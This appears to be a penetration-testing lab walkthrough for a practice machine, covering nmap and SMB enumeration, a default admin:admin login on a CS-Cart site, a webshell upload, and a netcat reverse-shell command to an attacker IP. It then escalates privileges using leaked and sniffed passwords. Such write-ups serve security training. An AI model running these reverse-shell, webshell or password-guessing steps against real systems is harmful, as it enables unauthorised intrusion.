### Enumeration
```
IP=192.168.214.39
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80,110,139,143,445,993,995 -A $IP
```
### Ports 
- 22
	- OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
- 80
	- Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
	- PHP/5.2.3-1ubuntu6
- 139
	- Samba smbd 3.X - 4.X
- 110
	- Dovecot pop3d
- 143
	- Dovecot imapd
- 445
	- Samba smbd 3.0.26a
- 993
	- ssl/imap    Dovecot imapd
- 995
	- ssl/pop3    Dovecot pop3d
### Foothold
- RPC/ SMB
	- enum4linux -U $IP
		- ![[Pasted image 20240708085110.png]]
		- domain: MSHOME
- 445
	- smbclient -N -L //$IP
		- anonymous login successful
		- shares
			- print$
			- IPC$
	- nmap --script smb-vuln* -p135,139,445 $IP
		- not vulnerable
- 80
	- ![[Pasted image 20240708085509.png]]
	- Version: Cs-cart
		- Multiple vulnerabilities for cs-cart
		- Running php pages
	- Login
		- admin:admin
			- successful
	- Directory Brute force
		- dirsearch -u http://$IP
			- /admin
				- admin:admin login successful
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
	- Exploits
		- https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c
		- Go into template editor and upload webshell.phtml
		- http://192.168.214.39/skins/webshell.phtml
		- We can run commands
		- nc -c /bin/bash 192.168.45.195 443  >  RCE
### PE
#### Linux
- www-data
	- id
		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
	- sudo -l
		- requires password
	- uname -a
		- Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
	- getcap -r / 2>/dev/null
		- nothing
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- nothing
	- Users with console
		- root
		- patrick
	- linpeas
		- /var/www/config.php
			- username: cscart
			- password: root
		- /root/.ssh/authorized_keys
			- `ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzx6C2kxbb2qPx9eRyW072CYpMhpa2zAlzgdBcElRS49cvTJlDcjqvC8DlpZL9FplzcfpCmD2xisb0VdHUtG2iteYQG5WaxUEeHd4t9XRqA9zCU3QjKq4jIDoT1A54HYLoEBk/jTxjUbaczfoFSgcZEOivBIZEM6usJW4gDgbpok1UoxHfmn7rRs43rgBKxKMpFZyp0+MsDlvKMZUie6F0mY60E2YSlwoyLAJKi0q1/oWB5Kmd3YtP20LIsVqvmbX7zcMXwXgztff0Wxj1dps0x6i1StYx1l14sU84comlceyZjzeYpqMoL+4OtWt4goqTqpiQasnXfv2vhNvCQXQaQ== root@explorer`
			- ssh -i id_rsa.pub root@$IP
				- no matching key
			- ssh -i /root/.ssh/authorized_keys root@localhost
				- needs password
			- ssh2john id_rsa.pub > id.hash
				- couldn't parse keyfile
	- mysql -u cscart -p
		- ERROR 1045 (28000): Access denied for user 'cscart'@'localhost' (using password: YES)
	- /root
		- capture.cap
			- Move to A
			- wireshark
				- Password for brett: ilovesecuritytoo
				- ![[Pasted image 20240708095156.png]]
	- su patrick
		- patrick  -  successful
		- sudo -l
			- (ALL) ALL
		- sudo su
			- we are root
### Credentials
admin:admin  for port 80
### Lessons Learned
- Try basic password for su 